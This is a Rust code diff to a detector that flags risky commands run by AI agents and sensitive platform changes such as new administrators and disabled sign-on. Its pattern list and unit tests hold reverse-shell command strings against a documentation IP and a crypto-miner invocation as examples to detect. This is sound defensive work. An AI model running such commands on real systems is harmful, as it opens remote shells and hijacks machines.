@@ -10,9 +10,12 @@ pub struct Hit {
     pub evidence: Option<String>,
 }
 
+/// A shell wired to a socket; reading or writing `/dev/tcp` alone is an ordinary port check.
 const REVERSE_SHELL: &[&str] = &[
-    "/dev/tcp/",
-    "/dev/udp/",
+    ">& /dev/tcp/",
+    ">&/dev/tcp/",
+    "<>/dev/tcp/",
+    "<> /dev/tcp/",
     "nc -e ",
     "nc -c ",
     "ncat -e ",
@@ -214,15 +217,52 @@ pub fn spend_spike(hour: f64, usual: f64) -> Option<Hit> {
 }
 
 /// A person's change that weakens the installation's defences or hands out its key.
-pub fn sensitive_change(kind: &str, login: Option<&str>) -> Option<Hit> {
-    let what = match kind {
-        "oidc.disable" => "turned off single sign-on",
-        "backup.key_downloaded" => "downloaded the credential key that opens every backup",
+pub fn platform_change(kind: &str, detail: &serde_json::Value, login: Option<&str>) -> Option<Hit> {
+    let (rule, severity, what) = match kind {
+        "oidc.disable" => (
+            "sensitive_change",
+            "low",
+            "turned off single sign-on".to_owned(),
+        ),
+        "oidc.configure" => (
+            "sensitive_change",
+            "low",
+            "changed which identity provider signs people in".to_owned(),
+        ),
+        "backup.key_downloaded" => (
+            "sensitive_change",
+            "low",
+            "downloaded the credential key that opens every backup".to_owned(),
+        ),
+        "account.create" if detail["administrator"] == true => (
+            "administrator_added",
+            "medium",
+            format!(
+                "made {} an administrator",
+                detail["login"].as_str().unwrap_or("an account")
+            ),
+        ),
+        "access.grant" => (
+            "access_granted",
+            "low",
+            format!(
+                "granted {}",
+                detail["capability"]
+                    .as_str()
+                    .unwrap_or("a capability")
+                    .replace('_', " ")
+            ),
+        ),
+        "provider.configure" | "provider.forget" | "provider.sign_in" | "provider.sign_out" => (
+            "provider_changed",
+            "low",
+            "changed the AI providers agents use".to_owned(),
+        ),
         _ => return None,
     };
     Some(Hit {
-        rule: "sensitive_change",
-        severity: "low",
+        rule,
+        severity,
         summary: format!("{} {what}", login.unwrap_or("Someone")),
         evidence: None,
     })
@@ -366,7 +406,7 @@ fn normalized(text: &str) -> String {
 }
 
 /// At most 300 characters of the masked text, enough to recognise the call in its trace.
-fn excerpt(text: &str) -> String {
+pub(super) fn excerpt(text: &str) -> String {
     let masked = mask(text.trim());
     match masked.char_indices().nth(300) {
         Some((cut, _)) => format!("{}…", &masked[..cut]),
@@ -382,6 +422,8 @@ mod tests {
     fn dangerous_commands_are_named_and_ordinary_ones_pass() {
         let shell = command("bash -i  >& /dev/tcp/203.0.113.9/4444 0>&1").unwrap();
         assert_eq!((shell.rule, shell.severity), ("reverse_shell", "high"));
+        let piped = command("exec 5<>/dev/tcp/203.0.113.9/80; sh <&5 >&5").unwrap();
+        assert_eq!(piped.rule, "reverse_shell");
         assert_eq!(
             command("./XMRig -o stratum+tcp://pool:3333").unwrap().rule,
             "miner"
@@ -404,6 +446,8 @@ mod tests {
             "pip install requests && python main.py",
             "cat /proc/self/environ",
             "nc -z example.com 443",
+            "timeout 3 bash -c '</dev/tcp/example.com/443' && echo open",
+            "echo > /dev/tcp/localhost/8080",
         ] {
             assert_eq!(command(ordinary), None, "{ordinary}");
         }
@@ -490,12 +534,24 @@ mod tests {
         assert_eq!(spend_spike(1.5, 0.0), None);
         assert_eq!(spend_spike(3.0, 1.0), None);
         assert!(spend_spike(6.0, 1.0).is_some());
-        assert_eq!(sensitive_change("agent.create", None), None);
+        let none = serde_json::json!({});
+        assert_eq!(platform_change("agent.create", &none, None), None);
         assert_eq!(
-            sensitive_change("oidc.disable", Some("ada"))
+            platform_change("oidc.disable", &none, Some("ada"))
                 .unwrap()
                 .summary,
             "ada turned off single sign-on"
+        );
+        let admin = serde_json::json!({"login": "bo", "administrator": true});
+        let hit = platform_change("account.create", &admin, Some("ada")).unwrap();
+        assert_eq!(
+            (hit.rule, hit.summary.as_str()),
+            ("administrator_added", "ada made bo an administrator")
+        );
+        let member = serde_json::json!({"login": "bo", "administrator": false});
+        assert_eq!(
+            platform_change("account.create", &member, Some("ada")),
+            None
         );
         assert!(
             burst("gmail__send", 12, 0)
